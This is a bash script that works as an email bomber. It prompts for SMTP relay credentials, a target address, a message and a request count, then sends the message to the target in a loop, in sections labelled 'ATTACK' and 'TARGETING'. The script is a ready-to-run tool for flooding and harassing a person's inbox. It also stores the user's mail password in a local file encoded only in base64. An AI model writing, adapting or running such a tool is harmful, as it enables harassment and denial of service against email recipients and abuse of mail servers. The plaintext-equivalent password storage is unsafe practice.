#!/bin/bash
# Author : WickedW0LF


# COLORS

white="\033[1;37m"
light_grey="\033[0;37m"
light_red="\033[1;31m"
yellow="\033[1;33m"
red="\033[0;31m"
on_green="\033[0;30m \033[42m"
light_green="\033[1;32m"
green="\033[0;32m"
light_blue="\033[1;34m"
cyan="\033[1;36m"
blue="\033[0;34m"
error="\033[5;37m\033[7;31m"
nc="\e[0m"

## BANNER

clear

echo -e "$light_blue" && cat << "BANNER"
                         ,ood8888booo,
                      ,oda8a888a888888bo,
                   ,od88888888aa888aa88a8bo,
                 ,da8888aaaa88a888aaaa8a8a88b,
                ,oa888aaaa8aa8888aaa8aa8a8a88o,
               ,88888aaaaaa8aa8888a8aa8aa888a88,
               8888a88aaaaaa8a88aa8888888a888888
               888aaaa88aa8aaaa8888; ;8888a88888
               Y888a888a888a8888;'   ;888888a88Y
                Y8a8aa8a888a88'      ,8aaa8888Y
                 Y8a8aa8aa8888;     ;8a8aaa88Y
                  `Y88aa8888;'      ;8aaa88Y'
          ,,;;;;;;;;'''''''         ;8888Y'
       ,,;                         ,888P
      ,;                           ;"
     ;       ;          ,    ,    ,;
    ;  ;,    ;     ,;;;;;   ;,,,  ;
   ;  ; ;  ,' ;  ,;      ;  ;   ;  ;
   ; ;  ; ;  ;  '        ; ,'    ;  ;
   `;'  ; ;  '; ;,       ; ;      ; ',
        ;  ;,  ;,;       ;  ;,     ;;;
         ;,,;             ;,,;

BANNER

echo -e "			"$light_grey"Author$light_red :$on_green W1ckedW0LF $nc\n"



## INTERNET CHECK

wget -q --spider https://google.com

if [ ! $? -eq 0 ]; then
  echo -e " $error You are offline! $nc\n"
  exit 1
fi


if [ ! `command -v sendemail` >/dev/null 2>&1 ]; then
  printf "$light_red Installing required packages: "
  sudo apt-get install sendemail -y > /dev/null

   if [ `dpkg -s sendemail | grep -o installed | head -1` = "installed" ]; then
          printf "$light_green Completed!"
     echo -e "\n\n"
   else
     printf "$error Error! "$nc"\n\n"
     exit 1
  fi
fi




program_new_session(){

		## LOGGING IN ##

		echo ""
		read -e -p "$(echo -e "$white"Enter the smpt relay"$light_red" : $light_green)" relay
		read -e -p "$(echo -e "$white"Enter your email"$light_red" : $light_green)" user
		unset pass
		prompt=$(echo -e "$white"Enter your password"$light_red" : $light_green)

		while IFS= read -p "$prompt" -r -s -n 1 pass ; do
		    if [[ $pass == $'\0' ]]
		    then
		    break
		    fi
		    prompt='*'
		    password+="$pass"
		done


## JUST TO MAKE SURE
echo -e "\n\n"$white"["$yellow"INFO"$white"]"$light_grey" Authenticate to "$light_blue"'$relay'$light_grey with $light_blue'$user'$nc\n"


## SAVE TO SETTINGS

read -e -p "$(echo -e "\n"$white"Do you want to save the credentials for later? ["$yellow"ENTER TO SKIP"$white"] ["$light_blue"Y/N"$white"] ")" store

	if [[ $store == "y" || $store == "Y" || $store == "yes" || $store == "YES" ]]; then

		better_than_nothing=`echo "$password" | base64`
		echo -e "$relay\n$user\n$better_than_nothing" > saved_settings

	fi



## TARGETING

read -e -p "$(echo -e "\n$white"Enter the target email$light_red : $light_green)" target
read -e -p "$(echo -e "$white"Enter the subject$light_red : $light_green)" sub
read -e -p "$(echo -e "$white"Enter the message$light_red : $light_green)" mess
read -e -p "$(echo -e "$white"Enter the number of requests$light_red : $light_green)" loop


## JUST TO MAKE SURE

echo -e "\n"$white"["$yellow"INFO"$white"]$light_grey Targeting "$light_blue"'$target'$light_grey with subject "$light_blue"'$sub'$light_grey and message $light_blue'$mess'$nc\n\n"


## CHECKING THE TARGET HOST

host=`echo "$target" | sed 's/^.*@/xxx /' | awk '{print $2}' `
wget -q --spider http://$host

if [ ! $? -eq 0 ]; then

 echo -e " $error Unknown host! $nc\n"
 exit 1

fi

nums=0

## ATTACK

for i in `eval echo {1..$loop}`; do

status=`echo -e ""$white"["$cyan"$(date "+%H:%M:%S")"$white"] "$white"["$red"*"$white"]"$green" TARGET$light_red :$light_grey "$target" "$white"("$blue""$host""$white")$green "`

sendemail -s $relay -xu $user -xp $password -f $user -t $target -u $sub -m $mess > /dev/null
 ((nums=$nums+1))
echo $status $(printf "$nums of $loop")

done
echo

}




program_load_session(){

		## LOGGING IN ##

		load_relay=`cat saved_settings | head -1`
                load_user=`cat saved_settings | sed -n -e 2p`
		load_pass=`cat saved_settings | sed -n -e 3p | base64 -d`

## JUST TO MAKE SURE
echo -e "\n\n"$white"["$yellow"INFO"$white"]"$light_grey" Authenticate to "$light_blue"'$load_relay'$light_grey with $light_blue'$load_user'$nc\n"



## TARGETING

read -e -p "$(echo -e "$white"Enter the target email$light_red : $light_green)" target
read -e -p "$(echo -e "$white"Enter the subject$light_red : $light_green)" sub
read -e -p "$(echo -e "$white"Enter the message$light_red : $light_green)" mess
read -e -p "$(echo -e "$white"Enter the number of requests$light_red : $light_green)" loop


## JUST TO MAKE SURE

echo -e "\n"$white"["$yellow"INFO"$white"]$light_grey Targeting "$light_blue"'$target'$light_grey with subject "$light_blue"'$sub'$light_grey and message $light_blue'$mess'$nc\n\n"


## CHECKING THE TARGET HOST

host=`echo "$target" | sed 's/^.*@/xxx /' | awk '{print $2}' `
wget -q --spider http://$host

if [ ! $? -eq 0 ]; then

 echo -e " $error Unknown host! $nc\n"
 exit 1

fi

nums=0

## ATTACK

for i in `eval echo {1..$loop}`; do

status=`echo -e ""$white"["$cyan"$(date "+%H:%M:%S")"$white"] "$white"["$red"*"$white"]"$green" TARGET$light_red :$light_grey "$target" "$white"("$blue""$host""$white")$green "`

sendemail -s $load_relay -xu $load_user -xp $load_pass -f $load_user -t $target -u $sub -m $mess > /dev/null
 ((nums=$nums+1))
echo $status $(printf "$nums of $loop")

done
echo

}



## LOAD SAVED DATA

if [ -s saved_settings ]; then

	echo -e "\n$white It appears you have a saved session.\n"
	read -e -p "$(echo -e " Do you wish to overwrite it? ["$yellow"ENTER TO USE"$white"] ["$light_blue"Y/N"$white"] ")" overwrite

	   if [[ $overwrite == "y" || $overwrite == "Y" || $overwrite == "yes" || $overwrite == "YES" ]]; then

		program_new_session

	   else

		program_load_session

	   fi
else

program_new_session

fi



